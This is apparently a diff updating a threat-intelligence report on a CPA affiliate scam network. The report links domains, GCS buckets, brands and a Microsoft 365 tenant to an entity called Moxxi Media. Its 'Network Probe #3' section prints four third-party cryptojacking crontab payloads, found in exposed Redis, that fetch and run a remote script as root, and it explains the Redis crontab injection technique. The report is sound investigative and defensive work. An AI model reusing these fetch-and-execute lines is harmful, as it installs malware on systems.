@@ -47,10 +47,12 @@ CPA affiliate scam funnel built with Lovable AI, distributed via TikTok.
 |--------|-----------|-----|------|
 | **epicfunnels.net** | Sav.com (2025-08-26) | Cloudflare (cheryl/logan) | Scam landing page + email |
 | **noodledit.com** | Cloudflare (2024-10-18) | Cloudflare (cass/felicity) | Asset CDN (GCS backend) |
-| **mydailysurge.com** | Unknown | Cloudflare (cass/felicity) | Second brand (Google Cloud, currently 404) |
+| **mydailysurge.com** | Cloudflare (2025-03-19) | Cloudflare (cass/felicity) | Second brand (Google Cloud, currently 404) |
 | **phef6trk.com** | Squarespace (2024-06-25) | Google Cloud DNS | CPA affiliate tracker (sinkholed) |
+| **myamericanprizes.com** | GoDaddy (**2023-08-22**) | Cloudflare (cass/felicity) | OG sweepstakes brand, M365 email (Moxxi Media) |
+| **olivimails.com** | — | — | EC2 hostname, **domain expired** |
 
-noodledit.com and mydailysurge.com share identical Cloudflare nameservers (cass/felicity) — same Cloudflare account. epicfunnels.net uses different CF nameservers (cheryl/logan).
+noodledit.com, mydailysurge.com, and myamericanprizes.com share identical Cloudflare nameservers (cass/felicity) — same Cloudflare account. epicfunnels.net uses different CF nameservers (cheryl/logan).
 
 ### Infrastructure
 
@@ -202,10 +204,13 @@ Layer 5: EMAIL
 ### Operator Profile
 
 - **Language**: Likely Spanish-speaking (afiliados, socio, socios, evento subdomains)
-- **Brands**: "GetnGoods" (scam pages), "MyDailySurge" (content blog)
+- **Entity**: **Moxxi Media** (moxximedia.onmicrosoft.com) — M365 tenant behind myamericanprizes.com
+- **Platform**: **CustomerTestConnect** (Express.js + Handlebars) — the backend that powers myamericanprizes.com
+- **Brands**: 15+ including GetnGoods, MyDailySurge, PrizeZappy, SnagNGoods, PlayZoodle, HealthPlanScouts, Fresh Health Plan, LendliV2, Prismique, BenefitsAccessCenter, OPG Housing, and more
+- **Verticals**: Gift card sweepstakes, electronics, vehicles, luxury goods, gas rewards, government benefits fraud (food stamps, stimulus, rental assistance), health insurance lead gen, lending
 - **Tools**: Lovable AI (scam generation), Webflow (SEO blog), standard DevOps (nginx, Dovecot, PostgreSQL, Node.js)
-- **Scale**: Multiple funnel names, multiple product variants (iPhone, MacBook), numbered daily landing pages — this is a **repeatable, templated operation**
-- **OpSec**: EXIF stripped, `noindex/nofollow`, Cloudflare proxied — but leaked internal hostname via SMTP, exposed PostgreSQL to internet, expired SSL cert not renewed
+- **Scale**: 747+ assets across 2 GCS buckets, 15+ brand names, daily rotating subdomains (1-31), multiple product variants — this is an **industrial-scale CPA lead generation factory**
+- **OpSec**: EXIF stripped, `noindex/nofollow`, Cloudflare proxied — but leaked internal hostname via SMTP, exposed PostgreSQL to internet, exposed Redis with no auth (now contains cryptojacking malware from a third party), publicly listable GCS buckets, expired SSL cert not renewed, olivimails.com domain expired
 
 ## Conclusion
 
@@ -675,4 +680,147 @@ Spamhaus status:      LISTED (CSS)
 M365 tenant:          DELETED
 Bot network:          ACTIVE (still farming engagement into a sinkhole)
 Working parts:         0
+```
+
+## Network Probe #3 (2026-04-09 04:20 UTC)
+
+Full-spectrum network reconnaissance. Raw data in `artifacts/probe-2026-04-08/`.
+
+### CRITICAL: Redis Contains Cryptojacking Malware
+
+The 4 Redis keys (`backup1`-`backup4`) are **crontab-formatted malware injection payloads**:
+
+```
+backup1: */2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
+backup2: */3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh
+backup3: */4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
+backup4: */5 * * * * root wd1 -q -O- http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
+```
+
+This is a classic Redis crontab injection attack — automated botnets write cron entries into unauthenticated Redis, then `CONFIG SET dir /var/spool/cron/` to dump them as root's crontab. `cd1`/`wd1` are obfuscated `curl`/`wget` (malware renames binaries to evade detection).
+
+The C2 domain `oracle.zzhreceive.top` is **dead** — no DNS, WHOIS says "does not exist" (expired .top domain via ZDNS registry). Redis CONFIG shows `dir=/data`, `dbfilename=dump.rdb` — Docker container defaults. The attack likely **failed** because the container filesystem can't reach `/var/spool/cron/`. But it proves the open Redis was found and exploited by automated malware scanners.
+
+### CRITICAL: GCS Bucket `b.noodledit.com` — 747-Asset Scam Factory
+
+Both GCS buckets are **publicly listable** (no auth required on `storage.googleapis.com`):
+
+- **b.noodledit.com**: 747 objects, 122.4 MB, date range 2024-10-22 to **2026-04-08 (today)**
+- **sassets.noodledit.com**: 28 objects, focused on MyDailySurge/PrizeZappy
+
+Most recent uploads (within 48 hours of probe):
+```
+2026-04-08  creditcard.png
+2026-04-06  OPG Housing.jpg, Picture2.jpg
+2026-04-01  icon_phone.svg
+2026-03-31  starbucks500.svg
+2026-03-30  celinepurse.png, kawasakimotorcycle.png, hermespurse.png,
+            norwegiancruiselinecruise.png, fordmavericktruck.png
+```
+
+#### 15+ Brand Names in Asset Inventory
+
+| Brand | Category | Evidence |
+|-------|----------|----------|
+| GetnGoods | Sweepstakes | Known (jessica.epicfunnels.net) |
+| MyDailySurge | Lead gen | Known (explore.mydailysurge.com) |
+| PrizeZappy | Sweepstakes | logo_prizezappy.svg, Prize Zappy.svg |
+| SnagNGoods | Sweepstakes | GetnGoods variant |
+| PrizeZar | Sweepstakes | prizezar*.svg |
+| PlayZoodle | Gaming | playzoodle_favicon.png (2026-03-20) |
+| HealthPlanScouts | Health insurance | healthplanscouts_dark_logo.svg |
+| Fresh Health Plan | Health insurance | logo_freshhealthplan.svg (2026-03-11) |
+| LendliV2 | Lending/loans | LendliV2.svg |
+| Prismique | Unknown | New prismique logo.svg |
+| CheckGo | Unknown | CheckGo.svg |
+| BenefitsAccessCenter | Gov benefits | benefitsaccesscenter*.svg |
+| TheDailyTipJar | Unknown | thedailytipjar*.svg |
+| OPG Housing | Housing assistance | OPG Housing.jpg (2026-04-06) |
+| CustomerTestConnect | Platform backend | myamericanprizes.com error page title |
+
+#### Promotion Categories (from `promotions/` directory)
+
+**Gift Cards**: Amazon $500/$1000, Walmart $750/$1000, Kroger $1000, Target, Dollar Tree $1000, Chipotle, Chick-fil-A $750, Publix $750, Casey's $750, Red Lobster $1000, Outback $1000, McDonald's, Starbucks $500, Macy's, Shein, Speedway $750
+
+**Vehicles**: GMC Canyon, Ford Maverick, Nissan Frontier, Chevrolet Colorado, Toyota RAV4, Corvette, Honda motorcycle, Indian Scout motorcycle, Kawasaki motorcycle
+
+**Luxury**: Celine purse, Hermes purse, E.l.f. cosmetics, perfume set, Ticketmaster, bedding set $1000
+
+**Gas Stations**: BP $750, Shell $750, Exxon $750, Speedway $750, gas card $500/$1000
+
+**Government Benefits Scams**: Food stamps/SNAP, inflation relief, stimulus checks, unemployment, rental assistance, student aid, startup grants, senior benefits, child/family assistance, tariff relief, unclaimed money
+
+**Electronics**: iPhone 17 Pro Max, MacBook, PlayStation 5, Samsung, Nintendo, JBL PartyBox 310, DeWalt, E-Bike, Smart Walking Stick
+
+**Travel**: Norwegian cruise line, Princess Cruises
+
+This is not a sweepstakes operation with a few gift card prizes. This is an **industrial-scale, multi-vertical CPA lead generation factory** spanning consumer goods, vehicles, luxury items, gas rewards, government benefits fraud, health insurance, lending, and gaming.
+
+### CRITICAL: Operating Entity Identified — Moxxi Media
+
+myamericanprizes.com DKIM selectors reveal the Microsoft 365 tenant name:
+
+```
+selector1._domainkey → selector1-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
+selector2._domainkey → selector2-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
+```
+
+**Moxxi Media** (`moxximedia.onmicrosoft.com`) is the entity operating myamericanprizes.com. The domain `moxximedia.com` is **not registered** — they only exist as a Microsoft 365 tenant. M365 tenant verification: `MS=ms46839871`.
+
+Additional myamericanprizes.com intelligence:
+- **Platform**: Express.js (Node.js) with Handlebars templates
+- **Error page title**: "Oops - CustomerTestConnect" (the backend platform name)
+- **Theme directory**: `/themes/myamericanprizes/`
+- **ActiveProspect verification**: `DdrUnuCT8xESAT7uOdJmqg==`
+- **Apple domain verification**: `ySS9fHR4xXuFRiE0`
+- **DMARC**: `p=none` with reporting to Cloudflare
+- **MX**: `myamericanprizes-com.mail.protection.outlook.com` (M365 Exchange)
+- **Autodiscover**: Full M365 integration (autodiscover.outlook.com)
+
+Note: epicfunnels.net has a **different** M365 tenant (`MS=ms66511106`, now deleted) while myamericanprizes.com uses `MS=ms46839871` (Moxxi Media, active). Two separate M365 tenants.
+
+### Domain Registration Timeline (WHOIS)
+
+| Domain | Created | Registrar | Expires | Status |
+|--------|---------|-----------|---------|--------|
+| myamericanprizes.com | **2023-08-22** | GoDaddy | 2026-08-22 | Active, full lock |
+| phef6trk.com | 2024-06-25 | Squarespace | 2026-06-25 | Sinkholed, DNSSEC |
+| noodledit.com | 2024-10-18 | Cloudflare | 2026-10-18 | Active (GCS CDN only) |
+| mydailysurge.com | 2025-03-19 | Cloudflare | **2027-03-19** | Active, renewed 2 yrs |
+| epicfunnels.net | 2025-08-26 | Sav.com | 2026-08-26 | Active |
+| olivimails.com | — | — | **EXPIRED** | No WHOIS match |
+
+Key: myamericanprizes.com is the **oldest domain** (Aug 2023). noodledit.com, mydailysurge.com, and myamericanprizes.com share **identical Cloudflare nameservers** (cass/felicity) — same Cloudflare account. olivimails.com has **expired** but the EC2 still uses it as the Hestia hostname.
+
+### SSL Certificate Findings
+
+**mydailysurge.com has 35 SANs** — a daily rotation scheme:
+
+```
+DNS: mydailysurge.com, www.mydailysurge.com, signup.mydailysurge.com,
+     trck.mydailysurge.com, 1.mydailysurge.com through 31.mydailysurge.com
+```
+
+One subdomain per day of the month. All numbered subdomains return 404 now — the rotation system is dead.
+
+**noodledit.com cert renewed 4 days ago** (2026-04-04) — infrastructure actively maintained.
+
+**CT log history**: myamericanprizes.com has 42 certs dating to Sep 2023. phef6trk.com has 17 certs (only `www.phef6trk.com`). olivimails.com has **zero** CT entries — never had a proper SSL cert.
+
+### Updated Statistics
+
+```
+Domains:                6  (olivimails.com now expired)
+Brand names:           15+ (was 2 — massive expansion from GCS bucket inventory)
+GCS bucket objects:   775  (747 + 28 across two buckets)
+GCS bucket size:      122.4 MB
+Promotion categories:   8  (gift cards, electronics, vehicles, luxury, gas, gov benefits, health, travel)
+Last asset upload:     2026-04-08 (day of probe)
+Operating entity:      Moxxi Media (moxximedia.onmicrosoft.com)
+Platform backend:      CustomerTestConnect (Express.js + Handlebars)
+Redis status:          COMPROMISED by cryptojacking botnet (attack failed)
+M365 tenants:          2 (ms66511106 deleted, ms46839871 active)
+CT log entries:        130+ (across all domains)
+Registrars used:       4 (GoDaddy, Squarespace, Cloudflare, Sav.com)
+Working parts:         0 (monetization still broken — tracker sinkholed)
 ```
